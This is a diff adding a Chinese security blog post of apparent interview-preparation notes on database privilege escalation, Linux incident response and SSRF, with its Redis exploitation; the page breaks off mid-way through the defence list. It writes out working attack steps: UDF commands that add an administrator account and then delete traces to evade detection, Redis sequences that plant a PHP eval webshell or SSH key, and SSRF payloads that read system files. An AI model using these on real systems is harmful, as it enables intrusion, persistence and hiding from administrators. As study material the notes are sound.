@@ -1,0 +1,678 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="数据库提权写shell方式https:&#x2F;&#x2F;developer.aliyun.com&#x2F;article&#x2F;1225524 MySQL 提权 CVE-2012-2122 漏洞利用：  确认目标 MySQL 版本在受影响范围内（MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23；MySQL versions from 5.1.63, 5.5.24, 5.6">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【工作】重要面经！">
+<meta property="og:url" content="https://godreams.cn/2024/03/26/work/workpreview/index.html">
+<meta property="og:site_name" content="g0dam">
+<meta property="og:description" content="数据库提权写shell方式https:&#x2F;&#x2F;developer.aliyun.com&#x2F;article&#x2F;1225524 MySQL 提权 CVE-2012-2122 漏洞利用：  确认目标 MySQL 版本在受影响范围内（MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23；MySQL versions from 5.1.63, 5.5.24, 5.6">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-03-26T02:55:36.000Z">
+<meta property="article:modified_time" content="2025-03-26T04:56:08.491Z">
+<meta property="article:author" content="g0dam">
+<meta property="article:tag" content="null">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>【工作】重要面经！</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="g0dam" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/idea/">Idea</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/09/10/PaperReading/Auto-Login/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/03/26/algorithm/workalgorithm/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://godreams.cn/2024/03/26/work/workpreview/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://godreams.cn/2024/03/26/work/workpreview/&text=【工作】重要面经！"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://godreams.cn/2024/03/26/work/workpreview/&title=【工作】重要面经！"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godreams.cn/2024/03/26/work/workpreview/&is_video=false&description=【工作】重要面经！"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=【工作】重要面经！&body=Check out this article: https://godreams.cn/2024/03/26/work/workpreview/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://godreams.cn/2024/03/26/work/workpreview/&title=【工作】重要面经！"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://godreams.cn/2024/03/26/work/workpreview/&title=【工作】重要面经！"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://godreams.cn/2024/03/26/work/workpreview/&title=【工作】重要面经！"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://godreams.cn/2024/03/26/work/workpreview/&title=【工作】重要面经！"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://godreams.cn/2024/03/26/work/workpreview/&name=【工作】重要面经！&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://godreams.cn/2024/03/26/work/workpreview/&t=【工作】重要面经！"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83%E5%86%99shell%E6%96%B9%E5%BC%8F"><span class="toc-number">1.</span> <span class="toc-text">数据库提权写shell方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL-%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.</span> <span class="toc-text">MySQL 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL-%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.</span> <span class="toc-text">MSSQL 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Oracle-%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.</span> <span class="toc-text">Oracle 提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%B5%81%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">应急响应流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">SSRF 漏洞原理与应用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">3.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF-%E6%BC%8F%E6%B4%9E%E4%B8%AD%E5%B8%B8%E7%94%A8%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%8A%9F%E8%83%BD%E5%92%8C%E4%BD%9C%E7%94%A8"><span class="toc-number">3.2.</span> <span class="toc-text">SSRF 漏洞中常用协议的功能和作用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-file-%E5%8D%8F%E8%AE%AE"><span class="toc-number">3.2.1.</span> <span class="toc-text">1. file 协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-dict-%E5%8D%8F%E8%AE%AE"><span class="toc-number">3.2.2.</span> <span class="toc-text">2. dict 协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-gopher-%E5%8D%8F%E8%AE%AE"><span class="toc-number">3.2.3.</span> <span class="toc-text">3. gopher 协议</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0"><span class="toc-number">3.3.</span> <span class="toc-text">漏洞发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.4.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8E-Redis-%E7%9A%84%E7%BB%93%E5%90%88%E5%88%A9%E7%94%A8"><span class="toc-number">3.5.</span> <span class="toc-text">与 Redis 的结合利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1"><span class="toc-number">3.6.</span> <span class="toc-text">漏洞防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%9C%E4%B8%BA%E4%BC%97%E6%B5%8B%E8%BF%90%E8%90%A5%E4%BA%BA%E5%91%98%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">4.</span> <span class="toc-text">作为众测运营人员的问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AD%89%E7%BA%A7%E8%AF%84%E5%88%A4%E6%A0%87%E5%87%86"><span class="toc-number">4.1.</span> <span class="toc-text">漏洞等级评判标准</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%9A%84%E9%80%BB%E8%BE%91%E5%92%8C%E6%B5%81%E7%A8%8B"><span class="toc-number">4.2.</span> <span class="toc-text">漏洞验证的逻辑和流程</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        【工作】重要面经！
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">g0dam</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-03-26T02:55:36.000Z" class="dt-published" itemprop="datePublished">2024-03-26</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="数据库提权写shell方式"><a href="#数据库提权写shell方式" class="headerlink" title="数据库提权写shell方式"></a>数据库提权写shell方式</h2><p><a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/1225524">https://developer.aliyun.com/article/1225524</a></p>
+<h3 id="MySQL-提权"><a href="#MySQL-提权" class="headerlink" title="MySQL 提权"></a>MySQL 提权</h3><ul>
+<li><p><strong>CVE-2012-2122 漏洞利用</strong>：</p>
+<ul>
+<li>确认目标 MySQL 版本在受影响范围内（MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23；MySQL versions from 5.1.63, 5.5.24, 5.6.6 之前）。</li>
+<li>使用 msf 模块 <code>auxiliary/scanner/mysql/mysql_authbypass_hashdump</code> 或 bash 循环不断尝试连接 MySQL 数据库，利用漏洞绕过密码验证获取 root 权限。</li>
+</ul>
+</li>
+<li><p><strong>Webshell 权限提升</strong>：</p>
+<ul>
+<li>确认满足写 shell 条件：知道网站物理路径、高权限数据库用户、load_file() 开启（secure_file_priv 无限制）、网站路径有写入权限。</li>
+<li>查看 secure_file_priv 是否有限制，若为 NULL 则需修改为 “” 并重启服务器。</li>
+<li>通过 phpmyadmin 或 sqlmap 执行 SQL 命令，将 shell 写入网站目录，再利用工具连接获取权限。</li>
+</ul>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> version();   # 获取数据库版本</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>();  # 获取数据库用户</span><br><span class="line"><span class="keyword">select</span> @<span class="variable">@basedir</span>;   # 获取数据库安装目录</span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> ‘<span class="operator">%</span>plugin<span class="operator">%</span>’; # 查看plugin路径。</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>日志写 shell 提权</strong>：</p>
+<ul>
+<li>确认 MySQL 版本 5.0 以上且 general_log 默认关闭。<blockquote>
+<p>在sqlmap&#x2F;data&#x2F;udf&#x2F;mysql目录下，在Windows目录中有32位和64位的dll文件（MySQL位数）。<br>文件夹中的dll文件是通过异或编码的，可以使用sqlmap&#x2F;extract&#x2F;cloak.py进行解码<br>python &#x2F;sqlmap&#x2F;extra&#x2F;cloak&#x2F;cloak.py -d -i &#x2F;sqlmap&#x2F;udf&#x2F;mysql&#x2F;windows&#x2F;64&#x2F;lib_mysqludf_sys.dll_<br>将解码后的DLL文件（包含用户自定义函数的DLL文件）上传到可写目录，再导入到MySQL\lib\plugin\中<br>select LOAD_FILE(‘C:&#x2F;可写目录&#x2F;lib_mysqludf_sys.dll’) into dumpfile ‘C:&#x2F;phpStudy2016&#x2F;MySQL&#x2F;lib&#x2F;plugin&#x2F;&gt; lib_mysqludf_sys.dll’;<br>将DLL中的函数引入到MySQL数据库中<br>创建自定义函数<br>create function sys_eval returns string soname ‘lib_mysqludf_sys.dll’;<br>创建名为sys_eval的函数，返回值为string类型，调用的文件是lib_mysqludf_sys.dll<br>注意：需要创建.dll文件中存在的函数，可以使用十六进制编辑器打开.dll文件，查看可以被创建的函数。<br>使用该函数去执行系统命令提权<br>查看当前用户权限<br>select sys_eval(“whoami”);<br>创建账号并提升为管理员权限<br>select sys_eval(“net user winhex passw@ord &#x2F;add”);<br>select sys_eval(“net localgroup administrators winhex &#x2F;add”);<br>将之前引入的函数删除掉<br>防止被管理员发现，防止其他攻击者使用<br>drop function sys_eval;<br>delete from mysql.func where name&#x3D;’sys_eval’;</p>
+</blockquote>
+</li>
+<li>开启 general_log，修改 general_log_file 路径为网站目录下的文件名。</li>
+<li>写入 shell 内容，利用工具连接获取权限。</li>
+</ul>
+</li>
+</ul>
+<p>Linux UDF提权：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/264790.html">https://www.freebuf.com/articles/web/264790.html</a></p>
+<ul>
+<li><p><strong>UDF 提权</strong>：</p>
+<ul>
+<li>判断 MySQL 版本，选择对应的动态链接库位置。</li>
+<li>将 sqlmap 中的动态链接库解码后上传到 MySQL 特定目录（根据版本选择目录）。</li>
+<li>创建自定义函数，利用该函数执行命令实现提权，最后可删除自定义函数清理痕迹。</li>
+</ul>
+</li>
+<li><p><strong>MOF 提权</strong>：</p>
+<ul>
+<li>确认目标系统版本为 2003 或之前，利用 mof 文件每五秒执行且为系统权限的特点。</li>
+<li>将包含 vbs 脚本的 mof 文件通过 mysql 的 load_file 写入指定目录，等待执行创建用户实现提权，清理痕迹需停止服务、删除相关文件并重启服务。</li>
+</ul>
+</li>
+<li><p><strong>启动项提权</strong>：</p>
+<ul>
+<li>确认系统启动项路径，根据系统版本选择对应路径。</li>
+<li>在 mysql 中创建表并插入创建用户和添加管理员权限的 vbs 脚本内容，将脚本写入启动项路径，重启后脚本执行实现提权。</li>
+</ul>
+</li>
+<li><p><strong>CVE-2016-6663、CVE-2016-6664 组合提权</strong>：</p>
+<ul>
+<li>对于 Mysql 小于特定版本的情况，先利用 CVE-2016-6663 将 www-data 权限提升为 mysql 权限，再利用 CVE-2016-6664 将 Mysql 权限提升为 root 权限。</li>
+</ul>
+</li>
+</ul>
+<h3 id="MSSQL-提权"><a href="#MSSQL-提权" class="headerlink" title="MSSQL 提权"></a>MSSQL 提权</h3><ul>
+<li><p><strong>xp_cmdshell 提权</strong>：</p>
+<ul>
+<li>开启 xp_cmdshell，利用其执行命令实现提权，如添加用户、替换粘贴键、传马等操作，完成后可关闭 xp_cmdshell 清理痕迹。</li>
+</ul>
+</li>
+<li><p><strong>sp_OACreate 提权</strong>：</p>
+<ul>
+<li>开启 Ole Automation Procedures，利用 sp_OACreate 执行命令实现提权，如直接加用户、粘贴键替换、直接传马、启动项写入加账户脚本等操作。</li>
+</ul>
+</li>
+<li><p><strong>沙盒提权</strong>：</p>
+<ul>
+<li>开启默认关闭的 xp_regwrite 存储过程，利用 jet.oledb 执行系统命令添加系统账号实现提权。</li>
+</ul>
+</li>
+</ul>
+<h3 id="Oracle-提权"><a href="#Oracle-提权" class="headerlink" title="Oracle 提权"></a>Oracle 提权</h3><ul>
+<li><p><strong>通过注入存储过程提权</strong>：</p>
+<ul>
+<li>手工注入：用户登录后查看权限，创建提权函数并注入到存在 sql 注入的存储过程中，执行命令提升权限。</li>
+<li>利用 MSF 注入：加载攻击模块，配置参数后运行实现提权。</li>
+</ul>
+</li>
+<li><p><strong>通过 utl_http.request 存储过程提权</strong>：</p>
+<ul>
+<li>创建 Java 包和存储过程 MYJAVACMD，执行该存储过程实现提权。</li>
+</ul>
+</li>
+</ul>
+<h2 id="应急响应流程"><a href="#应急响应流程" class="headerlink" title="应急响应流程"></a>应急响应流程</h2><ol>
+<li>查看用户信息</li>
+</ol>
+<ul>
+<li>查看用户信息文件：<code>cat /etc/passwd</code></li>
+<li>查看影子文件：<code>cat /etc/shadow</code></li>
+<li>查看特权账户（UID为0）：<code>awk -F: &#39;$3==0&#123;print $1&#125;&#39; /etc/passwd</code> 或 <code>cat /etc/passwd | grep x:0</code></li>
+<li>查看当前登录用户及其登录IP：<code>who</code></li>
+<li>查看当前登录用户及其正在执行的程序：<code>w</code></li>
+<li>查看系统负载、登录用户数等信息：<code>uptime</code></li>
+<li>查看密码文件最后修改时间：<code>stat /etc/passwd</code></li>
+<li>查看除不可登录用户外的其他用户：<code>cat /etc/passwd | grep -v nologin</code></li>
+<li>查看能用bash shell登录的用户：<code>cat /etc/passwd | grep /bin/bash</code></li>
+</ul>
+<ol start="2">
+<li>历史命令</li>
+</ol>
+<ul>
+<li>查看历史命令：<code>history</code></li>
+<li>保存历史命令到文件：<code>cat .bash_history &gt;&gt; history.txt</code></li>
+</ul>
+<ol start="3">
+<li>端口</li>
+</ol>
+<ul>
+<li>查看端口开放和连接情况：<code>netstat -pantu</code></li>
+<li>查看可疑进程文件路径（根据PID）：<code>ls -l /proc/&lt;pid&gt;/exe</code></li>
+</ul>
+<ol start="4">
+<li>进程</li>
+</ol>
+<ul>
+<li>查看所有进程：<code>ps -aux</code></li>
+<li>查看指定进程：<code>ps -aux | grep &lt;pid&gt;</code></li>
+<li>查看CPU占用率前十的进程：<code>ps aux --sort=pcpu | head -10</code></li>
+</ul>
+<ol start="5">
+<li>自启项</li>
+</ol>
+<ul>
+<li>查看开机启动项：<code>systemctl list-unit-files | grep enabled</code></li>
+</ul>
+<ol start="6">
+<li>定时任务</li>
+</ol>
+<ul>
+<li>查看当前用户定时任务：<code>crontab -l</code></li>
+<li>查看指定用户定时任务（如root）：<code>crontab -u root -l</code></li>
+</ul>
+<ol start="7">
+<li>进程监控</li>
+</ol>
+<ul>
+<li>动态监控进程（按CPU占用排序）：<code>top</code></li>
+<li>按内存使用排序监控：<code>top -b</code>（在top界面按<code>M</code>键）</li>
+<li>监控指定进程：<code>top -p &lt;pid&gt;</code></li>
+<li>静态监控进程：<code>ps -ef</code></li>
+</ul>
+<ol start="8">
+<li>Host文件</li>
+</ol>
+<ul>
+<li>查看Host文件是否被篡改：<code>cat /etc/hosts</code></li>
+</ul>
+<ol start="9">
+<li>登录日志</li>
+</ol>
+<ul>
+<li>统计爆破root账号失败次数及IP：<code>grep &quot;Failed password for root&quot; /var/log/secure | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more</code></li>
+<li>查看成功登录的日期、用户名、IP：<code>grep &quot;Accepted &quot; /var/log/secure | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39;</code></li>
+</ul>
+<ol start="10">
+<li>命令状态</li>
+</ol>
+<ul>
+<li>查看命令文件修改时间（防止被替换）：<code>stat /bin/netstat</code></li>
+</ul>
+<h2 id="SSRF-漏洞原理与应用"><a href="#SSRF-漏洞原理与应用" class="headerlink" title="SSRF 漏洞原理与应用"></a>SSRF 漏洞原理与应用</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/114626708">https://blog.csdn.net/qq_44159028/article/details/114626708</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/117034100">https://blog.csdn.net/qq_44159028/article/details/117034100</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/195">https://xz.aliyun.com/news/195</a></p>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>SSRF（Server-Side Request Forgery，服务器端请求伪造）是一种安全漏洞，攻击者通过构造恶意请求，使服务器端作为代理发起请求，从而访问外网无法直接访问的内部系统或服务。SSRF 漏洞的形成原因通常是服务端提供了从其他服务器获取数据的功能，且未对目标地址进行过滤与限制。</p>
+<h3 id="SSRF-漏洞中常用协议的功能和作用"><a href="#SSRF-漏洞中常用协议的功能和作用" class="headerlink" title="SSRF 漏洞中常用协议的功能和作用"></a>SSRF 漏洞中常用协议的功能和作用</h3><h4 id="1-file-协议"><a href="#1-file-协议" class="headerlink" title="1. file 协议"></a>1. file 协议</h4><p><strong>功能</strong>：</p>
+<ul>
+<li><strong>读取本地文件</strong>：在有回显的情况下，利用 file 协议可以读取服务器本地的任意文件内容。例如，读取 Linux 系统中的 <code>/etc/passwd</code> 文件或 Windows 系统中的 <code>C:\Windows\System32\drivers\etc\hosts</code> 文件。</li>
+</ul>
+<p><strong>作用</strong>：</p>
+<ul>
+<li><strong>信息泄露</strong>：攻击者可以通过读取敏感文件获取服务器的配置信息、用户账户信息等。</li>
+<li><strong>进一步渗透</strong>：获取的文件内容可能包含其他敏感信息，如数据库连接字符串、密钥等，有助于进一步渗透目标系统。</li>
+</ul>
+<p><strong>示例</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/ssrf.php?url=file:///etc/passwd</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-dict-协议"><a href="#2-dict-协议" class="headerlink" title="2. dict 协议"></a>2. dict 协议</h4><p><strong>功能</strong>：</p>
+<ul>
+<li><strong>泄露安装软件版本信息</strong>：通过 dict 协议可以获取目标服务器上安装的软件版本信息。</li>
+<li><strong>查看端口</strong>：可以用于探测目标服务器上特定端口是否开放。</li>
+<li><strong>操作内网 Redis 服务</strong>：可以利用 dict 协议与内网中的 Redis 服务进行交互，执行命令。</li>
+</ul>
+<p><strong>作用</strong>：</p>
+<ul>
+<li><strong>信息收集</strong>：获取目标服务器的软件版本和端口信息，有助于进一步攻击。</li>
+<li><strong>内网渗透</strong>：通过与内网中的 Redis 服务交互，可以执行命令，进一步渗透内网。</li>
+</ul>
+<p><strong>示例</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://127.0.0.1/pikachu/vul/ssrf/ssrf_curl.php?url=dict://127.0.0.1:6379/info</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-gopher-协议"><a href="#3-gopher-协议" class="headerlink" title="3. gopher 协议"></a>3. gopher 协议</h4><p><strong>功能</strong>：</p>
+<ul>
+<li><strong>支持发出 GET、POST 请求</strong>：gopher 协议支持发送 GET 和 POST 请求，可以先截获这些请求包，再构造成符合 gopher 协议的请求。</li>
+<li><strong>万能协议</strong>：gopher 协议是 SSRF 利用中最强大的协议之一，可以用于反弹 Shell、攻击内网的 Redis、FTP 等服务。</li>
+</ul>
+<p><strong>作用</strong>：</p>
+<ul>
+<li><strong>灵活攻击</strong>：可以构造复杂的请求，实现对目标服务器的多种攻击。</li>
+<li><strong>内网渗透</strong>：利用 gopher 协议可以攻击内网中的各种服务，如 Redis、MySQL 等。</li>
+</ul>
+<p><strong>示例</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/ssrf.php?url=gopher://66.112.213.76:2333/_hello</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h3><ol>
+<li><strong>检查服务端功能</strong>：查看服务端是否存在从其他服务器获取数据的功能，如加载图片、下载文件、读取文件内容等。</li>
+<li><strong>检测常用函数使用</strong>：检查代码中是否使用了 <code>curl_exec()</code>、<code>file_get_contents()</code>、<code>fsockopen()</code> 等函数，且未对输入进行严格过滤。</li>
+<li><strong>测试 URL 参数</strong>：通过修改 URL 参数，尝试访问本地文件（如 <code>file:///etc/passwd</code>）或内网地址，观察服务器响应。</li>
+</ol>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ol>
+<li><strong>读取本地文件</strong><ul>
+<li><strong>Windows</strong>：使用 <code>file://C:\Windows\System32\drivers\etc\hosts</code> 等路径读取系统文件。</li>
+<li><strong>Linux</strong>：使用 <code>file:///etc/passwd</code> 等路径读取系统文件。</li>
+</ul>
+</li>
+<li><strong>端口扫描</strong><ul>
+<li>使用 <code>dict://IP地址:端口</code> 或 <code>http://IP地址:端口</code> 探测内网端口开放情况，根据页面响应时间判断端口是否开放。</li>
+</ul>
+</li>
+<li><strong>内网主机探测</strong><ul>
+<li>通过读取 <code>/etc/hosts</code>、<code>/proc/net/arp</code> 等文件获取内网网段，使用脚本对内网 IP 进行爆破，探测存活主机。</li>
+</ul>
+</li>
+<li><strong>攻击内网服务</strong><ul>
+<li>利用 SSRF 漏洞访问内网的 Redis、MySQL 等服务，进一步渗透内网资产。</li>
+</ul>
+</li>
+</ol>
+<h3 id="与-Redis-的结合利用"><a href="#与-Redis-的结合利用" class="headerlink" title="与 Redis 的结合利用"></a>与 Redis 的结合利用</h3><ol>
+<li><strong>探测 Redis 服务</strong><ul>
+<li>使用 SSRF 漏洞向 Redis 默认端口 6379 发起请求，如 <code>dict://127.0.0.1:6379</code>，判断 Redis 服务是否开放。</li>
+</ul>
+</li>
+<li><strong>写入 SSH 公钥</strong><ul>
+<li>在攻击机生成 SSH 密钥对，将公钥内容通过 Redis 写入目标服务器的 <code>~/.ssh/authorized_keys</code>，实现无密码登录。</li>
+<li>Redis 命令示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line">set 1 &#x27;公钥内容&#x27;</span><br><span class="line">config set dir /root/.ssh</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><strong>写入 Webshell</strong><ul>
+<li>构造 Redis 命令，设置 Webshell 内容并将其写入目标服务器的网站根目录，如 <code>/var/www/html</code>。</li>
+<li>Redis 命令示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line">set 1 &#x27;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&#x27;</span><br><span class="line">config set dir /var/www/html</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><strong>反弹 Shell</strong><ul>
+<li>通过写入计划任务或利用 Redis 的数据备份功能写入 Webshell，实现反弹 Shell。</li>
+</ul>
+</li>
+</ol>
+<h3 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><ol>
+<li><strong>限制协议</strong>：仅允许 HTTP 和 HTTPS 请求。</li>
+<li><strong>限制 IP</strong>：避免应用被用来获取内网数据，攻击内网。</li>
+<li><strong>限制端口</strong>：限制请求的端口为常用的 HTTP 端口，如 80、443、8080 等。</li>
